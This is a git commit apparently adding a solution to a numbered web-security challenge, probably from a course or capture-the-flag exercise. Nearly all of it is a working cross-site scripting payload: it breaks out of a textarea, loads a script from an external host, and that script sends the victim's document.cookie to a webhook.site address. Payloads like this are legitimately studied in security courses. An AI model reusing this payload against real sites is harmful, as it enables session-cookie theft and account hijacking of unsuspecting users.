8e735dd62e7d53e029b2e77cfd5a396aed33b75f
LQuina96 <150941722+LQuina96@users.noreply.github.com>
2024-12-02 17:33:22 +0000

    Add files via upload

---
+++ 04_Read_my_Lips_No_More_Scripts.js
@@ -0,0 +1,9 @@
+/*this is what the inline script looks like now, pointing to a site where you are hosting the script*/
+</textarea>
+<script src="https://web.tecnico.ulisboa.pt/ist1110707/hack.js"></script>
+<textarea>
+
+/*content of file.js*/
+let xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/da8cf7f9-8a97-4bb9-9995-d910c82ed4a9?cookie='+document.cookie);
+xhttp.send();
